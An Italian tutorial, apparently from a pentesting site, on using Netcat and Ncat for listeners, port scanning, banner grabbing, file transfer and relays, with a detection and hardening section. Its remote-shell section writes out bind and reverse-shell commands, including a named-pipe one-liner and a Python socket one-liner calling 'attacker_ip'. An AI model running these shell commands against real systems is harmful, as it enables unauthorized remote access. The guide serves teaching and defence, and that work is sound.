---
title: 'Netcat (nc): Comandi, Port Scanning e Trasferimento File'
slug: netcat
description: 'Scopri come usare Netcat (nc) su Linux e Windows: comandi pratici, listener TCP/UDP, scansione porte, banner grabbing, trasferimento file e reverse shell.'
image: /netcat-tool-hacking-linux-windows.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - netcat
  - nc
  - Reverse Shell
  - Port Scanning
  - ncat
featured: false
---

# Netcat: Guida Pratica a Listener, Port Scan e Trasferimento File

Netcat (`nc`) è un'utility da riga di comando che legge e scrive dati su connessioni TCP e UDP. Serve per aprire un listener, testare una porta, leggere il banner di un servizio, trasferire file e, nei lab autorizzati, ottenere una shell remota. In questa guida trovi i comandi per **Linux e Windows**, con la sintassi corretta per ogni variante (Traditional, OpenBSD, Ncat), perché `nc` non si comporta allo stesso modo su tutti i sistemi.

## Comandi Essenziali (Riferimento Rapido)

La sintassi dipende dalla variante. Controlla la tua con `nc -h` prima di copiare qualsiasi comando (vedi [Varianti di Netcat](#varianti-di-netcat)).

| Obiettivo                         | Traditional                  | OpenBSD                  | Ncat                                |
| --------------------------------- | ---------------------------- | ------------------------ | ----------------------------------- |
| Listener TCP                      | `nc -l -p 4444`              | `nc -l 4444`             | `ncat -l 4444`                      |
| Listener UDP                      | `nc -u -l -p 5000`           | `nc -u -l 5000`          | `ncat -u -l 5000`                   |
| Listener che non si chiude        | non supportato               | `nc -k -l 4444`          | `ncat -k -l 4444`                   |
| Test porta                        | `nc -zv host 80`             | `nc -zv host 80`         | `ncat -zv host 80`                  |
| Banner grabbing                   | `nc -w 3 host 22`            | `nc -w 3 host 22`        | `ncat -w 3 host 22`                 |
| Ricevere file                     | `nc -l -p 3000 > file`       | `nc -l 3000 > file`      | `ncat -l 3000 --recv-only > file`   |
| Inviare file                      | `nc -q 1 host 3000 < file`   | `nc -N host 3000 < file` | `ncat --send-only host 3000 < file` |
| Esegui programma alla connessione | `nc -l -p 4444 -e /bin/bash` | non disponibile          | `ncat -l 4444 -e /bin/bash`         |

Su Windows usa `ncat.exe`: la guida completa è in [Ncat.exe su Windows](https://hackita.it/articoli/ncat-exe/).

## Cos'è Netcat

Netcat è un'utility che funziona sia da client sia da server: apre una connessione verso un servizio remoto oppure resta in ascolto su una porta e aspetta che qualcuno si colleghi. Creato da Hobbit nel 1995, oggi esiste in più implementazioni con opzioni diverse. Lavora sui protocolli di trasporto [TCP](https://hackita.it/articoli/tcp/) e [UDP](https://hackita.it/articoli/udp/).

Cosa puoi fare con Netcat:

* Aprire un listener su una porta (TCP o UDP)
* Connetterti a servizi remoti e leggerne il banner
* Verificare se una porta è raggiungibile
* Trasferire file e directory
* Fare relay e port forwarding semplice
* Ottenere una bind shell o una reverse shell (solo in ambienti autorizzati)

## Varianti di Netcat

Il motivo più comune per cui un comando "non funziona come nella guida" è la variante installata.

| Variante           | Caratteristiche                                                                                             | Dove la trovi                                               |
| ------------------ | ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| Netcat Traditional | Sintassi classica, `-l -p porta`, supporta `-e` se compilato con quell'opzione                              | `netcat-traditional` su Debian/Ubuntu, alcune distro legacy |
| Netcat OpenBSD     | `-e` rimosso, `-l` usa la porta come argomento (`nc -l 4444`), supporta `-k` e `-N`                         | `netcat-openbsd` su Debian/Ubuntu, macOS                    |
| Ncat               | Parte della suite [Nmap](https://hackita.it/articoli/nmap/): SSL, proxy, `--sh-exec`, `-e`, `--allow`, `-k` | Installato con Nmap, disponibile anche su Windows           |

Non esiste una variante "ufficiale" unica: ognuna è mantenuta da un progetto diverso. Verifica quale hai:

```bash
nc -h
ncat --version
ls -l "$(command -v nc)"
```

Su Debian e Ubuntu `nc` è un link gestito da `update-alternatives`: puoi cambiare variante con `sudo update-alternatives --config nc`.

## Installazione

Controlla se è già presente:

```bash
nc -h
netcat -h
ncat -h
```

**Debian / Ubuntu / [Kali Linux](https://hackita.it/articoli/kali-linux/):**

```bash
sudo apt install netcat-openbsd
# oppure
sudo apt install netcat-traditional
# oppure Ncat
sudo apt install ncat
```

**Fedora / RHEL 8+ / CentOS Stream:**

```bash
sudo dnf install nmap-ncat
```

Su RHEL/CentOS 7 il comando equivalente è `sudo yum install nmap-ncat`. Il pacchetto che fornisce `nc` è `nmap-ncat` (non esiste un pacchetto chiamato semplicemente `nc`).

**Arch Linux:**

```bash
sudo pacman -S openbsd-netcat   # variante OpenBSD
sudo pacman -S gnu-netcat       # variante GNU
```

**macOS:** `nc` è già incluso (variante BSD).

## Netcat su Windows

Windows non include Netcat. La scelta più sicura è **Ncat**, distribuito con Nmap dal sito ufficiale.

```powershell
winget install Insecure.Nmap
ncat -h
```

Oppure scarica l'installer (o lo zip di Ncat) da nmap.org. Installazione, opzioni e uso di `ncat.exe` sono spiegati in [Ncat.exe: guida per Windows](https://hackita.it/articoli/ncat-exe/).

Attenzione ai file `nc.exe` scaricati da siti non ufficiali: sono spesso modificati e vengono segnalati come malware da Microsoft Defender. In un lab usa sempre Ncat da fonte ufficiale.

**Alternativa nativa con [PowerShell](https://hackita.it/articoli/powershell/) (nessun tool da installare):** `Test-NetConnection` verifica se una porta TCP è raggiungibile.

```powershell
Test-NetConnection 192.168.1.100 -Port 22
```

Scansione di un piccolo range (lenta, un tentativo alla volta):

```powershell
1..1024 | ForEach-Object {
  if ((Test-NetConnection 192.168.1.100 -Port $_ -WarningAction SilentlyContinue).TcpTestSucceeded) { "Aperta: $_" }
}
```

Per scansioni vere usa [Nmap](https://hackita.it/articoli/nmap/) o, per range molto ampi, [Masscan](https://hackita.it/articoli/masscan/).

## Sintassi Base

```bash
nc [opzioni] [host] [porta]
```

I comandi di shell usati negli esempi (`tar`, `mkfifo`, `ss`) sono raccolti in [top 100 comandi Linux](https://hackita.it/articoli/top-100-comandi-linux/).

Opzioni principali:

```text
-l          Modalità listener (server)
-p porta    Porta locale (Traditional/Ncat in ascolto; su OpenBSD non si usa con -l)
-k          Resta in ascolto dopo la chiusura della connessione (OpenBSD, Ncat)
-v / -vv    Output verboso
-n          Nessuna risoluzione DNS
-z          Zero-I/O: controlla la porta senza inviare dati (scanning)
-u          UDP invece di TCP
-w sec      Timeout in secondi
-N          Chiude il socket a fine input (OpenBSD)
-q sec      Chiude dopo EOF sullo stdin (Traditional)
-e cmd      Esegue un comando alla connessione (Traditional, Ncat; assente su OpenBSD)
```

**Client**, connessione a un servizio remoto:

```bash
nc 192.168.1.100 80
```

**Server**, listener sulla porta 4444:

```bash
nc -l -p 4444     # Traditional / Ncat
nc -l 4444        # OpenBSD
```

Listener su una sola interfaccia (utile per non esporre la porta su tutte le schede di rete):

```bash
nc -l 192.168.1.10 4444     # OpenBSD
ncat -l 192.168.1.10 4444   # Ncat
```

Listener che resta attivo dopo la prima connessione:

```bash
nc -k -l 4444     # OpenBSD
ncat -k -l 4444   # Ncat
```

## Analisi di Rete

### Banner Grabbing

Il banner è il messaggio che alcuni servizi inviano appena ti connetti.

```bash
# SSH: il server invia subito la versione
nc -w 3 target.com 22

# SMTP: il server risponde con un 220
nc -w 3 mail.target.com 25
```

Per capire cosa fare dopo un banner SSH vedi la guida su [SSH](https://hackita.it/articoli/ssh/) e [SSH Audit](https://hackita.it/articoli/ssh-audit/); per SMTP vedi la [porta 25 SMTP](https://hackita.it/articoli/porta-25-smtp/).

Per HTTP devi inviare una richiesta. `echo` non interpreta `\r\n` in modo affidabile, usa `printf`, e includi l'intestazione `Host` (senza, i server con più siti rispondono con la pagina sbagliata):

```bash
printf 'HEAD / HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n' | nc -w 3 target.com 80
```

Cosa puoi dedurre: l'header `Server` e altre intestazioni indicano software e a volte versione. Non è una prova: molte configurazioni nascondono o falsificano questi valori. Il quadro completo del servizio è nella guida alla [porta 80 HTTP](https://hackita.it/articoli/porta-80-http/). HTTPS richiede TLS, vedi [Netcat e SSL/TLS con Ncat](#netcat-e-ssltls-con-ncat).

### Port Scanning

Porta singola:

```bash
nc -zv 192.168.1.100 22
```

Range di porte con timeout ridotto:

```bash
nc -zvw 1 192.168.1.100 1-1000 2>&1 | grep -E 'succeeded|open'
```

`nc` scrive l'output su stderr, per questo serve `2>&1` prima del `grep`. Il testo cambia per variante: OpenBSD stampa `succeeded!`, Traditional stampa `open`.

```text
Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
Connection to 192.168.1.100 80 port [tcp/http] succeeded!
```

Netcat va bene per verifiche puntuali. Per scansioni complete con rilevamento di servizi, sistema operativo e script NSE usa [Nmap](https://hackita.it/articoli/nmap/). Per capire come si mappano porte e servizi vedi [porte TCP/UDP nel pentest](https://hackita.it/articoli/porte-tcp-udp-pentest/).

### Test di Connettività TCP e UDP

```bash
nc -vz google.com 443
```

[UDP](https://hackita.it/articoli/udp/) non ha handshake: serve un listener dall'altra parte.

```bash
# Server
nc -u -l 5000      # OpenBSD  (Traditional: nc -u -l -p 5000)
# Client
nc -u server_ip 5000
```

Con UDP l'assenza di risposta **non** dimostra che la porta sia chiusa: i pacchetti possono essere scartati, filtrati o semplicemente ignorati dal servizio. Anche `nc -zvu host porta` è poco affidabile per lo stesso motivo.

## Trasferimento File

Netcat trasferisce i byte così come sono, quindi funziona anche con file binari. Il punto delicato è la **chiusura della connessione**: il ricevente termina solo quando il mittente chiude il socket, e ogni variante lo fa con un'opzione diversa.

**Ricezione:**

```bash
nc -l -p 3000 > file_ricevuto.zip     # Traditional
nc -l 3000 > file_ricevuto.zip        # OpenBSD
ncat -l 3000 --recv-only > file_ricevuto.zip   # Ncat
```

**Invio:**

```bash
nc -q 1 192.168.1.100 3000 < file_da_inviare.zip   # Traditional
nc -N 192.168.1.100 3000 < file_da_inviare.zip     # OpenBSD
ncat --send-only 192.168.1.100 3000 < file_da_inviare.zip   # Ncat
```

**Directory intere** (`tar` impacchetta; `z` comprime):

```bash
# Ricevente
nc -l 3000 | tar xzf -
# Mittente
tar czf - /percorso/directory | nc -N 192.168.1.100 3000
```

Su Windows PowerShell 5.1 gli operatori `<` e `>` non passano i byte in modo grezzo e possono corrompere i binari. Esegui i trasferimenti da `cmd.exe`. Per scaricare file su Windows senza tool aggiuntivi puoi usare [certutil.exe](https://hackita.it/articoli/certutilexe/), uno dei [LOLBins](https://hackita.it/articoli/lolbins/) più comuni.

Netcat non offre autenticazione, cifratura né controllo di integrità: usalo solo su reti fidate o come passaggio temporaneo. Per dati sensibili usa `scp` o `sftp` (vedi [SSH](https://hackita.it/articoli/ssh/)). Un'alternativa pensata per i lab Windows è [smbserver di Impacket](https://hackita.it/articoli/smbserver/).

**Verifica l'integrità** con SHA-256 su entrambi i lati e confronta i due valori: devono essere identici.

```bash
sha256sum file_originale.zip      # sul mittente
sha256sum file_ricevuto.zip       # sul ricevente
```

Su Windows: `certutil -hashfile file.zip SHA256` oppure `Get-FileHash file.zip -Algorithm SHA256`.

## Chat e Relay

**Chat semplice:**

```bash
# Host A
nc -l 5555            # OpenBSD  (Traditional: nc -l -p 5555)
# Host B
nc host_a_ip 5555
```

**Relay.** La pipeline `nc -l 8080 | nc remote_server 80` è **unidirezionale**: inoltra le richieste ma le risposte non tornano indietro al client. Per un relay bidirezionale serve una named pipe:

```bash
mkfifo /tmp/relay
nc -l 8080 < /tmp/relay | nc remote_server 80 > /tmp/relay
```

Con Ncat è più semplice:

```bash
ncat -l 8080 --sh-exec "ncat remote_server 80"
```

Gestisce una connessione alla volta (aggiungi `-k` per più connessioni in sequenza). Per un relay più flessibile esiste [Socat](https://hackita.it/articoli/socat/). Per un tunnel vero (SOCKS, più porte, connessioni parallele, resilienza) usa uno strumento dedicato come [Chisel](https://hackita.it/articoli/chisel/), [sshuttle](https://hackita.it/articoli/sshuttle/) o [Plink](https://hackita.it/articoli/plink/) su Windows. Per usare un proxy SOCKS con gli altri tool vedi [ProxyChains](https://hackita.it/articoli/proxychains/) e per il concetto generale [pivoting](https://hackita.it/articoli/pivoting/).

## Shell Remote

Solo in lab e ambienti autorizzati (HTB, CTF, laboratori propri).

### Bind Shell

Il target resta in ascolto ed espone la shell. Funziona solo se il target è raggiungibile direttamente (niente NAT o firewall in ingresso in mezzo).

```bash
# Target
nc -l -p 4444 -e /bin/bash        # Traditional
ncat -l 4444 -e /bin/bash         # Ncat
# Attaccante
nc target_ip 4444
```

Con Ncat puoi limitare chi si collega: `ncat -l 4444 --allow 192.168.1.50 -e /bin/bash`.

### Reverse Shell

Il target si connette verso l'attaccante. È utile con NAT o con regole in ingresso restrittive, ma **non aggira** un firewall configurato bene: se il traffico in uscita è filtrato o ispezionato, la connessione non parte.

```bash
# Attaccante
nc -lvnp 4444        # Traditional / Ncat  (OpenBSD: nc -lvn 4444)
# Target Linux
nc attacker_ip 4444 -e /bin/bash
# Target Windows (con ncat.exe)
ncat.exe attacker_ip 4444 -e cmd.exe
```

Di solito la reverse shell arriva dopo una [RCE](https://hackita.it/articoli/rce/) o dopo l'upload di una [web shell](https://hackita.it/articoli/web-shell/).

### Senza il flag -e

Su Netcat OpenBSD e molte distro moderne `-e` non esiste. Alternative:

Named pipe:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

One-liner Python:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

Altre varianti (PHP, Perl, Ruby, Java) sono raccolte nella reverse shell cheat sheet di PentestMonkey. Dopo l'accesso iniziale il passo successivo è la [post-exploitation](https://hackita.it/articoli/post-exploitation/); per ottenere una sessione più completa vedi [Metasploit](https://hackita.it/articoli/metasploit/) e [msfconsole](https://hackita.it/articoli/msfconsole/).

### Upgrade a Shell Interattiva

Una shell Netcat non gestisce Ctrl+C, frecce, `su` o editor di testo. Per migliorarla:

```bash
# Sulla shell remota
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Premi Ctrl+Z, poi sul tuo terminale:
stty raw -echo; fg
# Premi Invio, poi sulla shell remota:
export TERM=xterm
```

Con una shell stabile puoi passare alla [privilege escalation su Linux](https://hackita.it/articoli/linux-privesc/) o, su Windows, alla [privilege escalation su Windows](https://hackita.it/articoli/privilege-escalation-windows/).

## Netcat e SSL/TLS con Ncat

Netcat classico non parla TLS. Ncat sì, con `--ssl`:

```bash
# Client verso un servizio HTTPS (apre la connessione TLS)
ncat --ssl example.com 443

# Listener cifrato
ncat -l 4443 --ssl --ssl-cert cert.pem --ssl-key key.pem
```

`--ssl` negozia TLS, ma la richiesta HTTP resta da scrivere a mano (come nel banner grabbing). Non sostituisce un client HTTP completo. Per capire come funzionano certificati e handshake vedi [TLS/SSL](https://hackita.it/articoli/tls-ssl/) e [HTTP/HTTPS](https://hackita.it/articoli/http-https/); per generare certificati e testare connessioni cifrate vedi [OpenSSL](https://hackita.it/articoli/openssl/).

## Risoluzione dei Problemi

**Connessione rifiutata:** la porta non è in ascolto o un firewall la blocca.

```bash
ss -tulpn                       # Linux: cosa è in ascolto
sudo nft list ruleset           # firewall nftables
sudo iptables -L -n             # firewall iptables
netsh advfirewall show allprofiles   # Windows
```

Per capire come ragiona un [firewall](https://hackita.it/articoli/firewall/) (stateful, applicativo, NGFW) vedi la guida dedicata.

**Timeout:** imposta un limite per non restare appeso.

```bash
nc -w 30 target_ip porta
```

**Il trasferimento non termina:** manca la chiusura del socket da parte del mittente. Usa `-N` (OpenBSD), `-q 1` (Traditional) o `--send-only` (Ncat).

**File corrotto:** Netcat trasferisce in binario. Cerca conversioni CRLF/LF o re-encoding (tipico di PowerShell 5.1) invece di cercare flag inesistenti.

**`-e` non riconosciuto:** variante OpenBSD. Usa la named pipe o passa a Ncat.

**`-p` e `-l` insieme danno errore:** su OpenBSD scrivi `nc -l 4444`.

## Detection e Hardening

### Controllare le connessioni attive

```bash
# Linux
ss -tulpn
lsof -i -P -n | grep LISTEN
ps aux | grep -E 'nc |ncat|netcat'
```

```powershell
# Windows
netstat -ano
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess
Get-Process -Id <PID>
```

`ss` e `lsof` mostrano i listener e il processo associato, ma da soli non dimostrano che si tratti di Netcat: collega sempre porta, PID e nome del binario. Per vedere i processi che compaiono e spariscono senza essere root c'è [pspy](https://hackita.it/articoli/pspy/). Per vedere cosa passa davvero sulla connessione (payload, pattern, riuso della porta) la cattura con [Wireshark](https://hackita.it/articoli/wireshark/), [tcpdump](https://hackita.it/articoli/tcpdump/) o [TShark](https://hackita.it/articoli/tshark/) è il passo successivo.

### Indicatori di compromissione

* Listener su porte non standard (4444, 1337, 31337)
* Processi `nc`/`ncat` lanciati con `-e` o `--sh-exec`
* Connessioni in uscita verso IP esterni sospetti su porte insolite
* Named pipe in `/tmp` abbinate a processi Netcat
* Voci di [cron](https://hackita.it/articoli/crontab/) o task pianificati che richiamano `nc`/`ncat`: un attaccante può usarle per far ripartire la connessione, quindi cercale (panoramica in [persistenza su Linux](https://hackita.it/articoli/linux-persistence/))

```bash
crontab -l
grep -rE '\b(nc|ncat|netcat)\b' /etc/cron* /var/spool/cron 2>/dev/null
```

Su Windows controlla anche i [task pianificati](https://hackita.it/articoli/scheduled-task/) e i [LOLBins](https://hackita.it/articoli/lolbins/): un attaccante può evitare Netcat del tutto.

### Mitigazioni

```bash
# Rimuovi Netcat se non serve
sudo apt remove netcat-traditional netcat-openbsd ncat

# Esempio: blocca una porta specifica in uscita (nftables, tabella e chain già esistenti)
sudo nft add rule inet filter output tcp dport 4444 drop

# Audit sull'esecuzione del binario reale (nc è spesso un link simbolico)
sudo auditctl -w "$(readlink -f "$(command -v nc)")" -p x -k netcat_execution
```

Limiti da tenere presenti:

* Bloccare una sola porta non ferma le reverse shell: l'attaccante cambia porta. La difesa efficace è l'egress filtering (consenti solo il traffico in uscita necessario).
* Le regole `nft`/`iptables` e `auditctl` da riga di comando **non sono persistenti**: salvale nella configurazione del firewall e in `/etc/audit/rules.d/`.
* Il backend firewall cambia da sistema a sistema (nftables, iptables, firewalld, ufw): adatta i comandi.

## Checklist Prima dell'Uso

* Autorizzazione scritta per il test
* Scope e obiettivi documentati
* Ambiente isolato o lab per i primi test
* Variante di Netcat verificata con `nc -h`
* Regole firewall controllate prima di aprire un listener
* Timeout impostati per evitare connessioni zombie
* Pulizia finale: chiudi i listener, rimuovi file temporanei e pipe

## Domande Frequenti

**Come verifico se Netcat è installato?**
Esegui `nc -h`, `netcat -h` o `ncat -h`: se uno risponde, è presente. Il testo di aiuto mostra anche la variante.

**Qual è la differenza tra Netcat e Ncat?**
Ncat è la riscrittura del progetto Nmap: aggiunge SSL/TLS, supporto proxy, `--allow`, `--sh-exec` e modalità broker. Netcat classico non li ha.

**Come apro un listener con Netcat?**
`nc -l -p 4444` (Traditional) oppure `nc -l 4444` (OpenBSD). Con Ncat: `ncat -l 4444`.

**Come tengo il listener attivo dopo la prima connessione?**
Con `-k`: `nc -k -l 4444` (OpenBSD) o `ncat -k -l 4444`. La variante Traditional non supporta `-k`.

**Come uso Netcat su Windows?**
Installa Ncat da Nmap (`winget install Insecure.Nmap`) e usa `ncat.exe`, come spiegato in [Ncat.exe su Windows](https://hackita.it/articoli/ncat-exe/). Per un semplice test di porta, PowerShell offre `Test-NetConnection host -Port 80`.

**Dove scarico Netcat per Windows?**
Da nmap.org, come parte di Nmap/Ncat. Evita i `nc.exe` di provenienza sconosciuta.

**Come testo se una porta è aperta?**
`nc -zv target porta`: modalità zero-I/O, nessun dato inviato. Su UDP il risultato non è affidabile.

**Netcat supporta HTTPS?**
Non nella variante classica. Ncat con `--ssl` apre la connessione TLS, ma la richiesta HTTP va scritta a mano.

**Perché `-e` non funziona?**
La variante OpenBSD lo ha rimosso per sicurezza. Usa la named pipe con `mkfifo`, oppure Ncat con `-e` o `--sh-exec`.

**Netcat può trasferire file?**
Sì, file e directory (con `tar`), ma senza cifratura né verifica di integrità: confronta gli hash SHA-256 a parte.

**Si può usare Netcat su qualsiasi sistema?**
Lo strumento in sé è legittimo e usato per diagnostica di rete. Usalo solo su sistemi tuoi o per cui hai un'autorizzazione esplicita: accessi non autorizzati possono avere conseguenze legali, che variano in base al paese e al caso.

## Risorse

* [nc(1), pagina di manuale OpenBSD](https://man.openbsd.org/nc)
* [Ncat Reference Guide, Nmap](https://nmap.org/book/ncat-man.html)
